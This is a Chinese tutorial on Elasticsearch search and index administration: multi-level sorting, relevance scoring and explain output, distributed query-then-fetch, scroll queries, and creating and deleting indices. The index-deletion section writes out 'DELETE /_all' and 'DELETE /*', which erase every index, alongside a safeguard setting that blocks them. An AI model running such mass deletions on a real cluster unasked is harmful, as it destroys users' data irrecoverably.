<h2 id="多级排序"><a href="#多级排序" class="headerlink" title="多级排序"></a>多级排序</h2><p>假定我们想要结合使用 date 和 _score 进行查询，并且匹配的结果首先按照日期排序，然后按照相关性排序：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"query"</span> : &#123;</span><br><span class="line">        <span class="string">"bool"</span> : &#123;</span><br><span class="line">            <span class="string">"must"</span>:   &#123; <span class="string">"match"</span>: &#123; <span class="string">"tweet"</span>: <span class="string">"manage text search"</span> &#125;&#125;,</span><br><span class="line">            <span class="string">"filter"</span> : &#123; <span class="string">"term"</span> : &#123; <span class="string">"user_id"</span> : 2 &#125;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"sort"</span>: [</span><br><span class="line">        &#123; <span class="string">"date"</span>:   &#123; <span class="string">"order"</span>: <span class="string">"desc"</span> &#125;&#125;,</span><br><span class="line">        &#123; <span class="string">"_score"</span>: &#123; <span class="string">"order"</span>: <span class="string">"desc"</span> &#125;&#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>排序条件的顺序是很重要的。结果首先按第一个条件排序，仅当结果集的第一个 sort 值完全相同时才会按照第二个条件进行排序，以此类推。</p>
<p>多级排序并不一定包含 _score 。你可以根据一些不同的字段进行排序， 如地理距离或是脚本计算的特定值。</p>
<p>注：Query-string 搜索 也支持自定义排序，可以在查询字符串中使用 sort 参数：<br>GET /_search?sort=date:desc&amp;sort=_score&amp;q=search</p>
<h2 id="多值字段的排序"><a href="#多值字段的排序" class="headerlink" title="多值字段的排序"></a>多值字段的排序</h2><p>一种情形是字段有多个值的排序， 需要记住这些值并没有固有的顺序；一个多值的字段仅仅是多个值的包装，这时应该选择哪个进行排序呢？</p>
<p>对于数字或日期，你可以将多值字段减为单值，这可以通过使用 min 、 max 、 avg 或是 sum 排序模式 。 例如你可以按照每个 date 字段中的最早日期进行排序，通过以下方法：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">"sort": &#123;</span><br><span class="line">    "dates": &#123;</span><br><span class="line">        "order": "asc",</span><br><span class="line">        "mode":  "min"</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="字符串排序与多字段"><a href="#字符串排序与多字段" class="headerlink" title="字符串排序与多字段"></a>字符串排序与多字段</h2><p>被解析的字符串字段也是多值字段， 但是很少会按照你想要的方式进行排序。如果你想分析一个字符串，如 fine old art ， 这包含 3 项。我们很可能想要按第一项的字母排序，然后按第二项的字母排序，诸如此类，但是 Elasticsearch 在排序过程中没有这样的信息。</p>
<p>你可以使用 min 和 max 排序模式（默认是 min ），但是这会导致排序以 art 或是 old ，任何一个都不是所希望的。</p>
<p>为了以字符串字段进行排序，这个字段应仅包含一项： 整个 not_analyzed 字符串。 但是我们仍需要 analyzed 字段，这样才能以全文进行查询</p>
<p>一个简单的方法是用两种方式对同一个字符串进行索引，这将在文档中包括两个字段： analyzed 用于搜索， not_analyzed 用于排序</p>
<p>但是保存相同的字符串两次在 _source 字段是浪费空间的。 我们真正想要做的是传递一个 单字段 但是却用两种方式索引它。所有的 _core_field 类型 (strings, numbers, Booleans, dates) 接收一个 fields 参数</p>
<p>该参数允许你转化一个简单的映射如：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">"tweet": &#123;</span><br><span class="line">    "type":     "string",</span><br><span class="line">    "analyzer": "english"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>为一个多字段映射如：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">"tweet": &#123; </span><br><span class="line">    "type":     "string",</span><br><span class="line">    "analyzer": "english",</span><br><span class="line">    "fields": &#123;</span><br><span class="line">        "raw": &#123; </span><br><span class="line">            "type":  "string",</span><br><span class="line">            "index": "not_analyzed"</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>tweet 主字段与之前的一样: 是一个 analyzed 全文字段。新的 tweet.raw 子字段是 not_analyzed.</p>
<p>现在，至少只要我们重新索引了我们的数据，使用 tweet 字段用于搜索，tweet.raw 字段用于排序：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"query"</span>: &#123;</span><br><span class="line">        <span class="string">"match"</span>: &#123;</span><br><span class="line">            <span class="string">"tweet"</span>: <span class="string">"elasticsearch"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"sort"</span>: <span class="string">"tweet.raw"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>以全文 analyzed 字段排序会消耗大量的内存。获取更多信息请看 聚合与分析 。</p>
<h1 id="什么是相关性"><a href="#什么是相关性" class="headerlink" title="什么是相关性?"></a>什么是相关性?</h1><p>每个文档都有相关性评分，用一个正浮点数字段 _score 来表示 。 _score 的评分越高，相关性越高。</p>
<p>查询语句会为每个文档生成一个 _score 字段。评分的计算方式取决于查询类型 不同的查询语句用于不同的目的： fuzzy 查询会计算与关键词的拼写相似程度，terms 查询会计算 找到的内容与关键词组成部分匹配的百分比，但是通常我们说的 relevance 是我们用来计算全文本字段的值相对于全文本检索词相似程度的算法。</p>
<p>Elasticsearch 的相似度算法 被定义为检索词频率/反向文档频率， TF/IDF ，包括以下内容：</p>
<p>检索词频率<br>   检索词在该字段出现的频率？出现频率越高，相关性也越高。 字段中出现过 5 次要比只出现过 1 次的相关性高。<br>反向文档频率<br>   每个检索词在索引中出现的频率？频率越高，相关性越低。检索词出现在多数文档中会比出现在少数文档中的权重更低。<br>字段长度准则<br>   字段的长度是多少？长度越长，相关性越低。 检索词出现在一个短的 title 要比同样的词出现在一个长的 content 字段权重更大。</p>
<p>单个查询可以联合使用 TF/IDF 和其他方式，比如短语查询中检索词的距离或模糊查询里的检索词相似度。</p>
<p>相关性并不只是全文本检索的专利。也适用于 yes|no 的子句，匹配的子句越多，相关性评分越高。</p>
<p>如果多条查询子句被合并为一条复合查询语句 ，比如 bool 查询，则每个查询子句计算得出的评分会被合并到总的相关性评分中。</p>
<p>注：我们有一️整章着眼于相关性计算和如何让其配合你的需求 控制相关度。</p>
<h2 id="理解评分标准"><a href="#理解评分标准" class="headerlink" title="理解评分标准"></a>理解评分标准</h2><p>当调试一条复杂的查询语句时， 想要理解 _score 究竟是如何计算是比较困难的。Elasticsearch 在 每个查询语句中都有一个 explain 参数，将 explain 设为 true 就可以得到更详细的信息。<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /_search?explain </span><br><span class="line">&#123;</span><br><span class="line">   "query"   : &#123; "match" : &#123; "tweet" : "honeymoon" &#125;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>explain 参数可以让返回结果添加一个 _score 评分的得来依据。</p>
<p>注：增加一个 explain 参数会为每个匹配到的文档产生一大堆额外内容，但是花时间去理解它是很有意义的。 如果现在看不明白也没关系 — 等你需要的时候再来回顾这一节就行。下面我们来一点点的了解这块知识点。</p>
<p>首先，我们看一下普通查询返回的元数据：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"_index"</span> :      <span class="string">"us"</span>,</span><br><span class="line">    <span class="attr">"_type"</span> :       <span class="string">"tweet"</span>,</span><br><span class="line">    <span class="attr">"_id"</span> :         <span class="string">"12"</span>,</span><br><span class="line">    <span class="attr">"_score"</span> :      <span class="number">0.076713204</span>,</span><br><span class="line">    "_source" :     &#123; ... trimmed ... &#125;,</span><br></pre></td></tr></table></figure></p>
<p>这里加入了该文档来自于哪个节点哪个分片上的信息，这对我们是比较有帮助的，因为词频率和 文档频率是在每个分片中计算出来的，而不是每个索引中：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;_shard&quot; :      1,</span><br><span class="line">&quot;_node&quot; :       &quot;mzIVYCsqSWCG_M_ZffSs9Q&quot;,</span><br></pre></td></tr></table></figure></p>
<p>然后它提供了 _explanation 。每个 入口都包含一个 description 、 value 、 details 字段，它分别告诉你计算的类型、计算结果和任何我们需要的计算细节。<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">"_explanation": &#123; (1)</span><br><span class="line">   "description": "weight(tweet:honeymoon in 0)</span><br><span class="line">                  [PerFieldSimilarity], result of:",</span><br><span class="line">   "value":       0.076713204,</span><br><span class="line">   "details": [</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="attr">"description"</span>: <span class="string">"fieldWeight in 0, product of:"</span>,</span><br><span class="line">         <span class="attr">"value"</span>:       <span class="number">0.076713204</span>,</span><br><span class="line">         <span class="attr">"details"</span>: [</span><br><span class="line">            &#123; (2)</span><br><span class="line">               "description": "tf(freq=1.0), with freq of:",</span><br><span class="line">               "value":       1,</span><br><span class="line">               "details": [</span><br><span class="line">                  &#123;</span><br><span class="line">                     <span class="attr">"description"</span>: <span class="string">"termFreq=1.0"</span>,</span><br><span class="line">                     <span class="attr">"value"</span>:       <span class="number">1</span></span><br><span class="line">                  &#125;</span><br><span class="line">               ]</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123; (3)</span><br><span class="line">               "description": "idf(docFreq=1, maxDocs=1)",</span><br><span class="line">               "value":       0.30685282</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123; (4)</span><br><span class="line">               "description": "fieldNorm(doc=0)",</span><br><span class="line">               "value":        0.25,</span><br><span class="line">            &#125;</span><br><span class="line">         ]</span><br><span class="line">      &#125;</span><br><span class="line">   ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>1.honeymoon 相关性评分计算的总结<br>2.检索词频率<br>3.反向文档频率<br>4.字段长度准则</p>
<p>注：输出 explain 结果代价是十分昂贵的，它只能用作调试工具 。千万不要用于生产环境。</p>
<p>第一部分是关于计算的总结。告诉了我们 honeymoon 在 tweet 字段中的检索词频率/反向文档频率或 TF/IDF， （这里的文档 0 是一个内部的 ID，跟我们没有关系，可以忽略。）</p>
<p>然后它提供了权重是如何计算的细节：</p>
<p>检索词频率:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">检索词 `honeymoon` 在这个文档的 `tweet` 字段中的出现次数。</span><br></pre></td></tr></table></figure></p>
<p>反向文档频率:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">检索词 `honeymoon` 在索引上所有文档的 `tweet` 字段中出现的次数。</span><br></pre></td></tr></table></figure></p>
<p>字段长度准则:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在这个文档中， `tweet` 字段内容的长度 -- 内容越长，值越小。</span><br></pre></td></tr></table></figure></p>
<p>复杂的查询语句解释也非常复杂，但是包含的内容与上面例子大致相同。 通过这段信息我们可以了解搜索结果是如何产生的。</p>
<p>注：JSON 形式的 explain 描述是难以阅读的， 但是转成 YAML 会好很多，只需要在参数中加上 format=yaml 。</p>
<h2 id="理解文档是如何被匹配到的"><a href="#理解文档是如何被匹配到的" class="headerlink" title="理解文档是如何被匹配到的"></a>理解文档是如何被匹配到的</h2><p>当 explain 选项加到某一文档上时， explain api 会帮助你理解为何这个文档会被匹配，更重要的是，一个文档为何没有被匹配。</p>
<p>请求路径为 /index/type/id/_explain ，如下所示：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /us/tweet/12/_explain</span><br><span class="line">&#123;</span><br><span class="line">   <span class="string">"query"</span> : &#123;</span><br><span class="line">      <span class="string">"bool"</span> : &#123;</span><br><span class="line">         <span class="string">"filter"</span> : &#123; <span class="string">"term"</span> :  &#123; <span class="string">"user_id"</span> : 2           &#125;&#125;,</span><br><span class="line">         <span class="string">"must"</span> :  &#123; <span class="string">"match"</span> : &#123; <span class="string">"tweet"</span> :   <span class="string">"honeymoon"</span> &#125;&#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>不只是我们之前看到的充分解释 ，我们现在有了一个 description 元素，它将告诉我们：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;failure to match filter: cache(user_id:[2 TO 2])&quot;</span><br></pre></td></tr></table></figure></p>
<p>也就是说我们的 user_id 过滤子句使该文档不能匹配到。</p>
<h2 id="Doc-Values-介绍"><a href="#Doc-Values-介绍" class="headerlink" title="Doc Values 介绍"></a>Doc Values 介绍</h2><p>当你对一个字段进行排序时，Elasticsearch 需要访问每个匹配到的文档得到相关的值。倒排索引的检索性能是非常快的，但是在字段值排序时却不是理想的结构。</p>
<p>.在搜索的时候，我们能通过搜索关键词快速得到结果集。<br>.当排序的时候，我们需要倒排索引里面某个字段值的集合。换句话说，我们需要 转置 倒排索引。</p>
<p>转置 结构在其他系统中经常被称作 列存储 。实质上，它将所有单字段的值存储在单数据列中，这使得对其进行操作是十分高效的，例如排序。</p>
<p>在 Elasticsearch 中，Doc Values 就是一种列式存储结构，默认情况下每个字段的 Doc Values 都是激活的，Doc Values 是在索引时创建的，当字段索引时，Elasticsearch 为了能够快速检索，会把字段的值加入倒排索引中，同时它也会存储该字段的 <code>Doc Values</code>。</p>
<p>Elasticsearch 中的 Doc Values 常被应用到以下场景：</p>
<p>.对一个字段进行排序<br>.对一个字段进行聚合<br>.某些过滤，比如地理位置过滤<br>.某些与字段相关的脚本计算</p>
<p>因为文档值被序列化到磁盘，我们可以依靠操作系统的帮助来快速访问。当 working set 远小于节点的可用内存，系统会自动将所有的文档值保存在内存中，使得其读写十分高速； 当其远大于可用内存，操作系统会自动把 Doc Values 加载到系统的页缓存中，从而避免了 jvm 堆内存溢出异常。</p>
<p>稍后会深入讨论 <code>Doc Values</code>。现在所有你需要知道的是排序发生在索引时建立的平行数据结构中。</p>
<h1 id="执行分布式检索"><a href="#执行分布式检索" class="headerlink" title="执行分布式检索"></a>执行分布式检索</h1><p>一个 CRUD 操作只对单个文档进行处理，文档的唯一性由 _index, _type, 和 routing values （通常默认是该文档的 _id ）的组合来确定。 这表示我们确切的知道集群中哪个分片含有此文档。</p>
<p>搜索需要一种更加复杂的执行模型因为我们不知道查询会命中哪些文档: 这些文档有可能在集群的任何分片上。 一个搜索请求必须询问我们关注的索引（index or indices）的所有分片的某个副本来确定它们是否含有任何匹配的文档。</p>
<p>但是找到所有的匹配文档仅仅完成事情的一半。 在 search 接口返回一个 page 结果之前，多分片中的结果必须组合成单个排序列表。 为此，搜索被执行成一个两阶段过程，我们称之为 query then fetch 。</p>
<h2 id="查询阶段"><a href="#查询阶段" class="headerlink" title="查询阶段"></a>查询阶段</h2><p>在初始 查询阶段 时， 查询会广播到索引中每一个分片拷贝（主分片或者副本分片）。 每个分片在本地执行搜索并构建一个匹配文档的 <em>优先队列</em>。</p>
<p>一个 优先队列 仅仅是一个存有 top-n 匹配文档的有序列表。优先队列的大小取决于分页参数 from 和 size 。例如，如下搜索请求将需要足够大的优先队列来放入100条文档。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"from"</span>: 90,</span><br><span class="line">    <span class="string">"size"</span>: 10</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个查询阶段的过程如图 图 14 “查询过程分布式搜索” 所示。<br><img src="https://mfaying.github.io/images/elasticsearch2.x/14.jpg" alt="avatar"><br>图 14. 查询过程分布式搜索<br>查询阶段包含以下三个步骤:<br>1.客户端发送一个 search 请求到 Node 3 ， Node 3 会创建一个大小为 from + size 的空优先队列。<br>2.Node 3 将查询请求转发到索引的每个主分片或副本分片中。每个分片在本地执行查询并添加结果到大小为 from + size 的本地有序优先队列中。<br>3.每个分片返回各自优先队列中所有文档的 ID 和排序值给协调节点，也就是 Node 3 ，它合并这些值到自己的优先队列中来产生一个全局排序后的结果列表。</p>
<p>当一个搜索请求被发送到某个节点时，这个节点就变成了协调节点。 这个节点的任务是广播查询请求到所有相关分片并将它们的响应整合成全局排序后的结果集合，这个结果集合会返回给客户端。</p>
<p>第一步是广播请求到索引中每一个节点的分片拷贝。就像 document GET requests 所描述的， 查询请求可以被某个主分片或某个副本分片处理， 这就是为什么更多的副本（当结合更多的硬件）能够增加搜索吞吐率。 协调节点将在之后的请求中轮询所有的分片拷贝来分摊负载。</p>
<p>每个分片在本地执行查询请求并且创建一个长度为 from + size 的优先队列—也就是说，每个分片创建的结果集足够大，均可以满足全局的搜索请求。 分片返回一个轻量级的结果列表到协调节点，它仅包含文档 ID 集合以及任何排序需要用到的值，例如 _score 。</p>
<p>协调节点将这些分片级的结果合并到自己的有序优先队列里，它代表了全局排序结果集合。至此查询过程结束。</p>
<p>注:一个索引可以由一个或几个主分片组成， 所以一个针对单个索引的搜索请求需要能够把来自多个分片的结果组合起来。 针对 multiple 或者 all 索引的搜索工作方式也是完全一致的–仅仅是包含了更多的分片而已。</p>
<h2 id="取回阶段"><a href="#取回阶段" class="headerlink" title="取回阶段"></a>取回阶段</h2><p>查询阶段标识哪些文档满足 搜索请求，但是我们仍然需要取回这些文档。这是取回阶段的任务, 正如 图 15 “分布式搜索的取回阶段” 所展示的。<br>图 15. 分布式搜索的取回阶段<br><img src="https://mfaying.github.io/images/elasticsearch2.x/15.jpg" alt="avatar"><br>分布式阶段由以下步骤构成：<br>1.协调节点辨别出哪些文档需要被取回并向相关的分片提交多个 GET 请求。<br>2.每个分片加载并 丰富 文档，如果有需要的话，接着返回文档给协调节点。<br>3.一旦所有的文档都被取回了，协调节点返回结果给客户端。</p>
<p>协调节点首先决定哪些文档 确实 需要被取回。例如，如果我们的查询指定了 { “from”: 90, “size”: 10 } ，最初的90个结果会被丢弃，只有从第91个开始的10个结果需要被取回。这些文档可能来自和最初搜索请求有关的一个、多个甚至全部分片。</p>
<p>协调节点给持有相关文档的每个分片创建一个 multi-get request ，并发送请求给同样处理查询阶段的分片副本。</p>
<p>分片加载文档体– _source 字段–如果有需要，用元数据和 search snippet highlighting 丰富结果文档。 一旦协调节点接收到所有的结果文档，它就组装这些结果为单个响应返回给客户端。</p>
<p>深分页（Deep Pagination）</p>
<p>先查后取的过程支持用 from 和 size 参数分页，但是这是 有限制的 。 要记住需要传递信息给协调节点的每个分片必须先创建一个 from + size 长度的队列，协调节点需要根据 number_of_shards * (from + size) 排序文档，来找到被包含在 size 里的文档。</p>
<p>取决于你的文档的大小，分片的数量和你使用的硬件，给 10,000 到 50,000 的结果文档深分页（ 1,000 到 5,000 页）是完全可行的。但是使用足够大的 from 值，排序过程可能会变得非常沉重，使用大量的CPU、内存和带宽。因为这个原因，我们强烈建议你不要使用深分页。</p>
<p>实际上， “深分页” 很少符合人的行为。当2到3页过去以后，人会停止翻页，并且改变搜索标准。而不会不知疲倦地一页一页的获取网页直到你的服务崩溃。</p>
<p>如果你 确实 需要从你的集群取回大量的文档，你可以通过用 scroll 查询禁用排序使这个取回行为更有效率，我们会在 later in this chapter 进行讨论。</p>
<h1 id="搜索选项"><a href="#搜索选项" class="headerlink" title="搜索选项"></a>搜索选项</h1><p>有几个 查询参数可以影响搜索过程。</p>
<h2 id="偏好"><a href="#偏好" class="headerlink" title="偏好"></a>偏好</h2><p>偏好这个参数 preference 允许 用来控制由哪些分片或节点来处理搜索请求。 它接受像 _primary, _primary_first, _local, _only_node:xyz, _prefer_node:xyz, 和 _shards:2,3 这样的值, 这些值在 search preference 文档页面被详细解释。</p>
<p>但是最有用的值是某些随机字符串，它可以避免 bouncing results 问题。</p>
<p>Bouncing Results</p>
<p>想象一下有两个文档有同样值的时间戳字段，搜索结果用 timestamp 字段来排序。 由于搜索请求是在所有有效的分片副本间轮询的，那就有可能发生主分片处理请求时，这两个文档是一种顺序， 而副本分片处理请求时又是另一种顺序。</p>
<p>这就是所谓的 bouncing results 问题: 每次用户刷新页面，搜索结果表现是不同的顺序。 让同一个用户始终使用同一个分片，这样可以避免这种问题， 可以设置 preference 参数为一个特定的任意值比如用户会话ID来解决。</p>
<h2 id="超时问题"><a href="#超时问题" class="headerlink" title="超时问题"></a>超时问题</h2><p>通常分片处理完它所有的数据后再把结果返回给协同节点，协同节点把收到的所有结果合并为最终结果。</p>
<p>这意味着花费的时间是最慢分片的处理时间加结果合并的时间。如果有一个节点有问题，就会导致所有的响应缓慢。</p>
<p>参数 timeout 告诉 分片允许处理数据的最大时间。如果没有足够的时间处理所有数据，这个分片的结果可以是部分的，甚至是空数据。</p>
<p>搜索的返回结果会用属性 timed_out 标明分片是否返回的是部分结果：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="string">"timed_out"</span>:     <span class="literal">true</span>,  (1)</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>(1)这个搜索请求超时了。</p>
<p>超时仍然是一个最有效的操作，知道这一点很重要； 很可能查询会超过设定的超时时间。这种行为有两个原因：<br>1.超时检查是基于每文档做的。 但是某些查询类型有大量的工作在文档评估之前需要完成。 这种 “setup” 阶段并不考虑超时设置，所以太长的建立时间会导致超过超时时间的整体延迟。<br>2.因为时间检查是基于每个文档的，一次长时间查询在单个文档上执行并且在下个文档被评估之前不会超时。 这也意味着差的脚本（比如带无限循环的脚本）将会永远执行下去。</p>
<h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><p>在 路由一个文档到一个分片中 中, 我们解释过如何定制参数 routing ，它能够在索引时提供来确保相关的文档，比如属于某个用户的文档被存储在某个分片上。 在搜索的时候，不用搜索索引的所有分片，而是通过指定几个 routing 值来限定只搜索几个相关的分片：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /_search?routing=user_1,user2</span><br></pre></td></tr></table></figure></p>
<p>这个技术在设计大规模搜索系统时就会派上用场，我们在 扩容设计 中详细讨论它。</p>
<h2 id="搜索类型"><a href="#搜索类型" class="headerlink" title="搜索类型"></a>搜索类型</h2><p>缺省的搜索类型是 query_then_fetch 。 在某些情况下，你可能想明确设置 search_type 为 dfs_query_then_fetch 来改善相关性精确度：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /_search?search_type=dfs_query_then_fetch</span><br></pre></td></tr></table></figure></p>
<p>搜索类型 dfs_query_then_fetch 有预查询阶段，这个阶段可以从所有相关分片获取词频来计算全局词频。 我们在 被破坏的相关度！ 会再讨论它。</p>
<h1 id="游标查询-Scroll"><a href="#游标查询-Scroll" class="headerlink" title="游标查询 Scroll"></a>游标查询 Scroll</h1><p>scroll 查询 可以用来对 Elasticsearch 有效地执行大批量的文档查询，而又不用付出深度分页那种代价。</p>
<p>游标查询允许我们 先做查询初始化，然后再批量地拉取结果。 这有点儿像传统数据库中的 cursor 。</p>
<p>游标查询会取某个时间点的快照数据。 查询初始化之后索引上的任何变化会被它忽略。 它通过保存旧的数据文件来实现这个特性，结果就像保留初始化时的索引 视图 一样。</p>
<p>深度分页的代价根源是结果集全局排序，如果去掉全局排序的特性的话查询结果的成本就会很低。 游标查询用字段 _doc 来排序。 这个指令让 Elasticsearch 仅仅从还有结果的分片返回下一批结果。</p>
<p>启用游标查询可以通过在查询的时候设置参数 scroll 的值为我们期望的游标查询的过期时间。 游标查询的过期时间会在每次做查询的时候刷新，所以这个时间只需要足够处理当前批的结果就可以了，而不是处理查询结果的所有文档的所需时间。 这个过期时间的参数很重要，因为保持这个游标查询窗口需要消耗资源，所以我们期望如果不再需要维护这种资源就该早点儿释放掉。 设置这个超时能够让 Elasticsearch 在稍后空闲的时候自动释放这部分资源。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /old_index/_search?scroll=1m (1)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"query"</span>: &#123; <span class="string">"match_all"</span>: &#123;&#125;&#125;,</span><br><span class="line">    <span class="string">"sort"</span> : [<span class="string">"_doc"</span>], (2)</span><br><span class="line">    <span class="string">"size"</span>:  1000</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>(1) 保持游标查询窗口一分钟。<br>(2) 关键字 _doc 是最有效的排序顺序。</p>
<p>这个查询的返回结果包括一个字段 _scroll_id<code>， 它是一个base64编码的长字符串 (((&quot;scroll_id&quot;))) 。 现在我们能传递字段</code>_scroll_id 到 _search/scroll 查询接口获取下一批结果：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /_search/scroll</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"scroll"</span>: <span class="string">"1m"</span>, (1)</span><br><span class="line">    <span class="string">"scroll_id"</span> : <span class="string">"cXVlcnlUaGVuRmV0Y2g7NTsxMDk5NDpkUmpiR2FjOFNhNnlCM1ZDMWpWYnRROzEwOTk1OmRSamJHYWM4U2E2eUIzVkMxalZidFE7MTA5OTM6ZFJqYkdhYzhTYTZ5QjNWQzFqVmJ0UTsxMTE5MDpBVUtwN2lxc1FLZV8yRGVjWlI2QUVBOzEwOTk2OmRSamJHYWM4U2E2eUIzVkMxalZidFE7MDs="</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>(1) 注意再次设置游标查询过期时间为一分钟。</p>
<p>这个游标查询返回的下一批结果。 尽管我们指定字段 size 的值为1000，我们有可能取到超过这个值数量的文档。 当查询的时候， 字段 size 作用于单个分片，所以每个批次实际返回的文档数量最大为 size * number_of_primary_shards 。</p>
<p>注意游标查询每次返回一个新字段 _scroll_id<code>。每次我们做下一次游标查询， 我们必须把前一次查询返回的字段</code>_scroll_id 传递进去。 当没有更多的结果返回的时候，我们就处理完所有匹配的文档了。</p>
<h1 id="索引管理"><a href="#索引管理" class="headerlink" title="索引管理"></a>索引管理</h1><p>要不了多久你就会开始想要优化索引和搜索过程，以便更好地适合您的特定用例。 这些定制几乎围绕着索引和类型的方方面面，在本章，我们将介绍管理索引和类型映射的 API 以及一些最重要的设置。</p>
<h2 id="创建一个索引"><a href="#创建一个索引" class="headerlink" title="创建一个索引"></a>创建一个索引</h2><p>到目前为止, 我们已经通过索引一篇文档创建了一个新的索引 。这个索引采用的是默认的配置，新的字段通过动态映射的方式被添加到类型映射。现在我们需要对这个建立索引的过程做更多的控制：我们想要确保这个索引有数量适中的主分片，并且在我们索引任何数据 之前 ，分析器和映射已经被建立好。</p>
<p>为了达到这个目的，我们需要手动创建索引，在请求体里面传入设置或类型映射，如下所示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT /my_index</span><br><span class="line">&#123;</span><br><span class="line">    &quot;settings&quot;: &#123; ... any settings ... &#125;,</span><br><span class="line">    &quot;mappings&quot;: &#123;</span><br><span class="line">        &quot;type_one&quot;: &#123; ... any mappings ... &#125;,</span><br><span class="line">        &quot;type_two&quot;: &#123; ... any mappings ... &#125;,</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果你想禁止自动创建索引，你 可以通过在 config/elasticsearch.yml 的每个节点下添加下面的配置：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">action.auto_create_index: false</span><br></pre></td></tr></table></figure></p>
<p>我们会在之后讨论你怎么用 索引模板 来预配置开启自动创建索引。这在索引日志数据的时候尤其有用：你将日志数据索引在一个以日期结尾命名的索引上，子夜时分，一个预配置的新索引将会自动进行创建。</p>
<h2 id="删除一个索引"><a href="#删除一个索引" class="headerlink" title="删除一个索引"></a>删除一个索引</h2><p>用以下的请求来 删除索引:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELETE /my_index</span><br></pre></td></tr></table></figure></p>
<p>你也可以这样删除多个索引：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELETE /index_one,index_two</span><br><span class="line">DELETE /index_*</span><br></pre></td></tr></table></figure></p>
<p>你甚至可以这样删除 全部 索引：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELETE /_all</span><br><span class="line">DELETE /*</span><br></pre></td></tr></table></figure></p>
<p>能够用单个命令来删除所有数据可能会导致可怕的后果。如果你想要避免意外的大量删除, 你可以在你的 elasticsearch.yml 做如下配置：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">action.destructive_requires_name: true</span><br></pre></td></tr></table></figure></p>
<p>这个设置使删除只限于特定名称指向的数据, 而不允许通过指定 _all 或通配符来删除指定索引库。你同样可以通过 Cluster State API 动态的更新这个设置。</p>
<h2 id="索引设置"><a href="#索引设置" class="headerlink" title="索引设置"></a>索引设置</h2><p>你可以通过修改配置来自定义索引行为，详细配置参照 索引模块<br>Elasticsearch 提供了优化好的默认配置。 除非你理解这些配置的作用并且知道为什么要去修改，否则不要随意修改。<br>下面是两个 最重要的设置：<br>number_of_shards<br>   每个索引的主分片数，默认值是 5 。这个配置在索引创建后不能修改。<br>number_of_replicas<br>   每个主分片的副本数，默认值是 1 。对于活动的索引库，这个配置可以随时修改。<br>例如，我们可以创建只有 一个主分片，没有副本的小索引：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT /my_temp_index</span><br><span class="line">&#123;</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;number_of_shards&quot; :   1,</span><br><span class="line">        &quot;number_of_replicas&quot; : 0</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后，我们可以用 update-index-settings API 动态修改副本数：<br>PUT /my_temp_index/_settings<br>{<br>    “number_of_replicas”: 1<br>}</p>
